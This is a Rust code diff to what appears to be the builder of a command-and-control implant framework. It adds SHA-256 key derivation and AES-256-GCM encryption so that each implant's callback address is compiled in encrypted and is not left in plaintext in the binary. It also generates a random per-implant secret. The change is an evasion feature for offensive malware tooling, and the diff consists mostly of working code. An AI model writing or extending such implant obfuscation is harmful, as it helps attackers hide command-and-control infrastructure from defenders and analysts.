@@ -103,6 +103,37 @@ fn check_prerequisites(target: &str) -> bool {
     true
 }
 
+/// Derive a 32-byte key using SHA-256 — must stay aligned with link-common::derive_key.
+fn derive_key_sha256(secret: &str, salt: &str) -> [u8; 32] {
+    use sha2::{Digest, Sha256};
+    let mut hasher = Sha256::new();
+    hasher.update(secret.as_bytes());
+    hasher.update(salt.as_bytes());
+    let result = hasher.finalize();
+    let mut key = [0u8; 32];
+    key.copy_from_slice(&result[..32]);
+    key
+}
+
+/// Encrypt `data` with AES-256-GCM and return hex(nonce || ciphertext).
+/// Must stay aligned with link-common::encrypt_config.
+fn encrypt_aes_gcm(data: &str, key: &[u8; 32]) -> String {
+    use aes_gcm::{
+        aead::{Aead, KeyInit},
+        Aes256Gcm, Nonce,
+    };
+    let nonce_bytes = rand::random::<[u8; 12]>();
+    let nonce = Nonce::from_slice(&nonce_bytes);
+    let cipher = Aes256Gcm::new_from_slice(key).expect("cipher init failed");
+    let ciphertext = cipher
+        .encrypt(nonce, data.as_bytes())
+        .expect("encryption failed");
+    let mut result = Vec::with_capacity(12 + ciphertext.len());
+    result.extend_from_slice(&nonce_bytes);
+    result.extend_from_slice(&ciphertext);
+    hex::encode(result)
+}
+
 fn build(callback: &str, crate_dir: &str, target: &str, output_name: &str) {
     let dir = Path::new(crate_dir);
     if !dir.exists() {
@@ -120,6 +151,11 @@ fn build(callback: &str, crate_dir: &str, target: &str, output_name: &str) {
     // Generate a random 32-byte secret for this implant
     let secret = hex::encode(rand::random::<[u8; 32]>());
 
+    // Encrypt the callback so it is not stored in plaintext in the binary.
+    // The implant derives the same key and calls decrypt_config(CALLBACK, &key).
+    let key = derive_key_sha256(&secret, "callback-salt");
+    let encrypted_callback = encrypt_aes_gcm(callback, &key);
+
     tracing::info!(
         "Building {} implant ({}) for {} …",
         output_name,
@@ -128,7 +164,7 @@ fn build(callback: &str, crate_dir: &str, target: &str, output_name: &str) {
     );
 
     let result = Command::new("cargo")
-        .env("CALLBACK", callback)
+        .env("CALLBACK", encrypted_callback)
         .env("IMPLANT_SECRET", &secret)
         .args(["build", "--release", "--target", target, "--quiet"])
         .current_dir(dir)
